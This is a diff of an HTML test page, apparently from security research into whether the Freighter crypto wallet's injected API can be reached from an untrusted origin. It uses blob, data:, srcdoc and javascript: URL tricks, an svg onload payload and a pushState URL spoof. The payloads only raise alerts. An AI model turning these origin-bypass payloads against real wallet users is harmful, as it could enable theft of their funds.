@@ -3,59 +3,34 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Chain V3 - github.io -> aqua.network</title>
-<style>body{background:#0a0a0a;color:#fff;font-family:monospace;text-align:center;padding:20px}button{padding:16px 24px;border-radius:12px;border:none;font-weight:700;margin:8px}.b1{background:#7B61FF;color:#fff}.b2{background:#00ff88;color:#000}.b3{background:#222;color:#fff}.log{background:#151515;border:1px solid #222;border-radius:10px;padding:12px;margin-top:16px;font-size:11px;text-align:left;white-space:pre-wrap}</style>
+<title>Bypass Scanner V4 - Freighter</title>
+<style>
+body{background:#0a0a0a;color:#fff;font-family:monospace;padding:16px}
+button{width:100%;padding:14px;margin:6px 0;border-radius:10px;border:none;font-weight:700}
+.good{background:#7B61FF;color:#fff} .warn{background:#222;color:#aaa}
+h2{color:#7B61FF} small{opacity:0.5}
+</style>
 </head>
 <body>
-<h3>Chain V3 - Freighter iOS</h3>
-<p style="opacity:0.6;font-size:11px">Goal: dari github.io dapet freighterApi:object</p>
+<h2>Bypass Scanner V4 - 0x403for</h2>
+<small>Semua alert() doang - safe</small>
 
-<button class="b1" onclick="step1()">1. TEST blob + aqua.network iframe</button>
-<button class="b2" onclick="step2()">2. TEST iframe aqua + javascript:</button>
-<button class="b3" onclick="step3()">3. TEST redirect chain</button>
+<button class="good" onclick="location.href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YTp1cmkgYnZwYXNzJyk8L3NjcmlwdD4='">1. data:text/html base64</button>
 
-<div id="log" class="log">Log: ready - tap button 1 dulu</div>
+<button class="good" onclick="const b=new Blob(['<script>alert(`blob bypass ${typeof freighterApi}`)</script>'],{type:'text/html'}); location.href=URL.createObjectURL(b)">2. blob: URL with script</button>
 
-<script>
-const log = (m)=>{ document.getElementById('log').innerText += '\n' + m; };
+<button class="good" onclick="document.write('<iframe srcdoc=&quot;<script>alert(`srcdoc bypass`)</script>&quot;></iframe>')">3. iframe srcdoc</button>
 
-function step1(){
-  const html = `
-    <h2>Blob - freighterApi: <script>document.write(typeof window.freighterApi)</script></h2>
-    <iframe src="https://aqua.network" style="width:100%;height:400px;border:1px solid #7B61FF"></iframe>
-    <script>
-      setTimeout(()=>{
-        try{
-          const f = document.querySelector('iframe').contentWindow;
-          alert('iframe freighterApi: '+ typeof f.freighterApi);
-        }catch(e){
-          alert('parent blob freighterApi: '+typeof window.freighterApi+' Error:'+e.message);
-        }
-      },3000);
-    </script>
-  `;
-  const blob = new Blob([html], {type:'text/html'});
-  location.href = URL.createObjectURL(blob);
-}
+<button class="good" onclick="location.href='javascript:alert(`js ${location.href}`)'">4. javascript: direct</button>
 
-function step2(){
-  const iframe = document.createElement('iframe');
-  iframe.src = 'https://aqua.network';
-  iframe.style.width='100%'; iframe.style.height='400px';
-  iframe.onload = ()=>{
-    try{
-      iframe.src = 'javascript:alert("freighterApi:"+typeof window.freighterApi)';
-    }catch(e){ log('fail: '+e.message); }
-  };
-  document.body.appendChild(iframe);
-}
+<button class="warn" onclick="const f=document.createElement('form'); f.action='javascript:alert(`form action js`)' ; document.body.appendChild(f); f.submit()">5. form action=javascript:</button>
 
-function step3(){
-  window.open('https://aqua.network', '_blank');
-  setTimeout(()=>{
-    window.open('javascript:alert("CHAIN freighterApi:"+typeof window.freighterApi+" url:"+location.href)', '_blank');
-  },1000);
-}
-</script>
+<button class="warn" onclick="window.open('data:text/html,<svg onload=alert(`window.open data`></svg>')">6. window.open data + svg</button>
+
+<button class="warn" onclick="history.pushState({},'','/fake-aqua'); alert('pushState spoof url:'+location.href)">7. history.pushState URL spoof</button>
+
+<button class="good" onclick="location.href='https://aqua.network'">8. buka aqua.network buat test manual</button>
+
+<script>console.log('freighterApi at load:', typeof window.freighterApi);</script>
 </body>
 </html>
